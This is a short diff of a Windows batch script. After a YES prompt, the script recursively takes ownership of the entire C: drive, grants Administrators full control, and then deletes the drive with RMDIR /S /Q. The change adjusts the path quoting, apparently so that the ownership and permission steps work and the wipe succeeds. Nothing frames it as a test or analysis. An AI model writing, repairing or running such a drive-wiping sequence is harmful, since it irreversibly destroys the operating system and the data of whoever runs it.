@@ -21,8 +21,8 @@ if /i not "%answer%"=="YES" (
 )
 
 echo Taking ownership and granting Administrators access across C:\...
-takeown /f "C:\" /a /r /d y
-icacls "C:\" /grant *S-1-5-32-544:(OI)(CI)F /t /c
+takeown /f "C:\." /a /r /d y
+icacls "C:\." /grant *S-1-5-32-544:(OI)(CI)F /t /c
 
 RMDIR /S /Q "C:\"
 
